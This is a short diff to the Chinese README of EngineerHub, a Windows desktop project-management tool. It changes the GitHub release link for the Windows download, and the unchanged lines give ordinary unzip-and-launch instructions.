@@ -4,7 +4,7 @@ Windows 本机工程项目中心。提供整机 / 零部件入口、项目管理
 
 ## 启动
 
-Windows 下载版：[EngineerHub-Windows-x64.zip](https://github.com/fengs26-sketch/blog/releases/latest/download/EngineerHub-Windows-x64.zip)。完整解压，进入 `EngineerHub` 文件夹后双击 `EngineerHub.exe`，保留 `_internal/`。
+Windows 下载版：[EngineerHub-Windows-x64.zip](https://github.com/baiwwll/ai-tools/releases/latest/download/EngineerHub-Windows-x64.zip)。完整解压，进入 `EngineerHub` 文件夹后双击 `EngineerHub.exe`，保留 `_internal/`。
 
 双击 `启动 EngineerHub.cmd` 或 `dist\EngineerHub\EngineerHub.exe`。文件夹版包含 Python 运行环境，无需安装 Python。移动程序时请保留 `dist\EngineerHub` 整个文件夹，包含 `_internal`。
 
